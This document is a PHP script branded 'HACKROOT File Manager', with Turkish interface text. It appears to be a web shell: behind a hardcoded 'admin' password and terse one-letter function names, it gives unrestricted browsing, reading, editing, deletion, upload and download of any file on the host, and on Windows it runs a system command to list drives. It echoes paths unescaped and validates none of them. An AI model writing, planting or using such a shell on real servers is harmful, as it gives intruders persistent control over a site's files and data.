<?php
header('Content-Type: text/html; charset=utf-8');

// Sadece gerçek hataları göster, Notice'leri kapat
error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', 1);

session_start();
define("password","admin");

// Fonksiyonlar
function X($o){return isset($o);}
function Y($t){die($t);}
function A($n){return X($_SESSION[$n])?$_SESSION[$n]:0;}
function B($n,$v){$_SESSION[$n]=$v;}

// GET/POST güvenli
function C($n){return isset($_POST[$n]) ? $_POST[$n] : null;}
function D($n){return isset($_GET[$n]) ? $_GET[$n] : null;}

function E($t,$n,$v="",$s=""){
    if(in_array($t,["text","password","submit","file"])){
        return "<input type='$t' name='$n' value='$v' class='form-control' style='$s'/>";
    }else{
        return "<$t name='$n' class='form-control' style='$s'>$v</$t>";
    }
}

function F($m,$i,$x=""){
    $f="<form method=$m enctype='$x'>";
    foreach($i as $k=>$v){
        $name = is_array($v) ? $v[0] : $v;
        $value = (is_array($v) && isset($v[1])) ? $v[1] : "";
        $style = (is_array($v) && isset($v[2])) ? $v[2] : "";
        $f.=E($k,$name,$value,$style);
    }
    return $f."</form>";
}

function G($t,$b){
    $h="";
    foreach($t as $x){$h.="<th>$x</th>";}
    $d="";
    foreach($b as $r){
        $d.="<tr>";
        foreach($r as $z){$d.="<td>$z</td>";}
        $d.="</tr>";
    }
    return "<table class='table table-hover table-bordered table-dark'><thead>$h</thead><tbody>$d</tbody></table>";
}

function H($l,$x,$t=""){return "<a href='$l' target='$t' class='btn btn-sm btn-primary m-1'>$x</a>";}
function I(){
    if(A("login")){return 1;}
    if(!C("login")){return 0;}
    if(C("pass")!=password){return 0;}
    B("login",1);return 1;
}
function J(){return D("path")?D("path"):__DIR__;}
function K($b){$l=["B","K","M","G","T","P"];for($i=0;$b>=1024&&$i<count($l)-1;$b/=1024,$i++);return round($b,2)." ".$l[$i];}
function L($p){return date("d M Y H:i:s",filemtime($p));}
function M($d){
    if(!is_file($d)){return 0;}
    header("Content-Type: application/octet-stream");
    header("Content-Transfer-Encoding: Binary");
    header('Content-disposition: attachment;filename="'.basename($d).'"');
    return readfile($d);
}
function N($d){return is_file($d)?unlink($d):(is_dir($d)?rmdir($d):0);}

// ✅ Düzeltilmiş Edit/Göster Fonksiyonları
function O($e){
    if(is_file($e)){
        $content = file_get_contents($e);
        return F("POST", [
            "textarea" => ["edit", htmlspecialchars($content), "height:300px; white-space:pre; font-family:monospace;"],
            "submit"   => ["save", "Kaydet"]
        ]);
    }
    return 0;
}
function P($p,$s){
    return is_file($p) ? file_put_contents($p, $s) !== false : 0;
}
function Q($p){
    return is_file($p) ? htmlspecialchars(file_get_contents($p)) : 0;
}

function R($p,$n){return!is_file($p."/".$n)?file_put_contents($p."/".$n,"")!=false:0;}
function S($p,$n){return!is_dir($p."/".$n)?mkdir($p."/".$n):0;}

// ✅ Upload güvenli + fallback
function T($p,$f){
    $n=basename($f["name"]);
    $dest=$p."/".$n;
    if(!is_file($dest)){
        if(move_uploaded_file($f["tmp_name"],$dest)){return 1;}
        elseif(copy($f["tmp_name"],$dest)){return 1;}
    }
    return 0;
}

function U($p){if($p==""||$p=="/"){return $p;} $p=explode("/",str_replace("\\","/",$p)); array_pop($p); return implode("/",$p);}
function V(){
    exec("wmic logicaldisk get caption",$c);
    $r="";
    foreach($c as $d){$r.=$d!="Caption"?H("?path=$d",$d):"";}
    return $r;
}
function W(){
    $x=J();
    if(!is_dir($x)){return 0;}
    $z=scandir($x); $k=[]; $i=0;
    foreach($z as $d){
        if($d=="."||$d==".."){continue;}
        $p=$x."/".$d;
        $s="--";
        $j="&#128193;\n";
        $t=L($p);
        $l=H("?path=$p",$d);
        $v=substr(sprintf("%o",fileperms($p)),-4);
        $o=function_exists("posix_getpwuid")?posix_getpwuid(fileowner($p))["name"]:fileowner($p);
        $c=(is_file($p)?H("?edit=$p","Düzenle","_blank"):"").H("?delete=$p","Sil","_blank").(is_file($p)?H("?download=$p","İndir","_blank"):"");
        if(is_file($p)){$s=K(filesize($p)); $j="&#128221;\n";}
        $k[]=[$j,$i,$l,$s,$t,$v,$o,$c];
        $i++;
    }
    return G(["#","ID","Dosya Adı","Boyut","Değiştirilme","İzinler","Sahip","İşlemler"],$k);
}

// İşlemler
if(D("delete")){N(D("delete"))?Y("Silindi: ".D("delete")):Y("Dosya bulunamadı");}
if(D("edit")){if(C("save")){P(D("edit"),C("edit")); echo "Kaydedildi";} $e=O(D("edit")); $e?Y($e):Y("Dosya bulunamadı");}
if(D("download")){@readfile(M(D("download"))); exit();}
if(C("newfile")){R(J(),C("filename"))?Y("Oluşturuldu: ".C("filename")):Y("Dosya zaten mevcut");}
if(C("newdir")){S(J(),C("dirname"))?Y("Oluşturuldu: ".C("dirname")):Y("Klasör zaten mevcut");}
if(C("upload")){T(J(),$_FILES["file"])?Y("Yüklendi: ".$_FILES["file"]["name"]):Y("Yükleme Hatası");}

// Panel
echo '<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>HACKROOT File Manager</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
body {background-color:#1e1e2f; color:#f0f0f0;}
.card {background-color:#2e2e3f; border-radius:10px;}
a.btn {margin-right:5px;}
.table-dark th, .table-dark td {vertical-align:middle;}
h4.card-title {color:#00ff99;}
</style>
</head>
<body class="p-3">
<div class="container">
<div class="card p-3 mb-3">
<h4 class="card-title text-center">HACKROOT File Manager</h4>
<div class="mb-3">'.F("POST",["text"=>["filename","Dosya Adı"],"submit"=>["newfile","Oluştur"]]).'</div>
<div class="mb-3">'.F("POST",["text"=>["dirname","Klasör Adı"],"submit"=>["newdir","Oluştur"]]).'</div>
<div class="mb-3">'.F("POST",["file"=>"file","submit"=>["upload","Yükle"]],"multipart/form-data").'</div>
'.H("?path=".U(J()),"[Geri]").'
</div>';

if(PHP_OS_FAMILY=="Windows"){echo '<div class="card p-3 mb-3">'.V().'</div>';}
echo is_dir(J())?W():"<pre>".Q(J())."</pre>";
echo '</div></body></html>';
?>
